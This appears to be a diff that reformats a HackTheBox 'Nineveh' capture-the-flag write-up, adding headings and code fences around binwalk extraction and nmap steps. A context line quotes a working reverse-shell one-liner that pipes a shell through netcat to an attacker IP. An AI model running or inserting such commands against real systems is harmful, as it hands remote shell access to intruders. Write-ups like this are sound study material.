@@ -106,10 +106,8 @@ rm /tmp/3;mkfifo /tmp/3;cat /tmp/3|/bin/sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/3
 ```
 ### Other attack vector:
 https://10.10.10.43/secure_notes/
-Show hidden content: 
-root@kali:~/HTB/Nineveh# binwalk -Me nineveh.png 
-...
-As a result:
+##### Show hidden content: 
+##### root@kali:~/HTB/Nineveh# binwalk -Me nineveh.png 
 ```shell
 Public key:
 root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# cat nineveh.pub 
@@ -172,7 +170,9 @@ PORT    STATE    SERVICE
 911/tcp filtered xact-backup
 
 Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
-Then:
+```
+##### Then:
+```shell
 root@kali:~/HTB/Nineveh# nmap -p 22 10.10.10.43
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 00:20 HKT
 Nmap scan report for 10.10.10.43
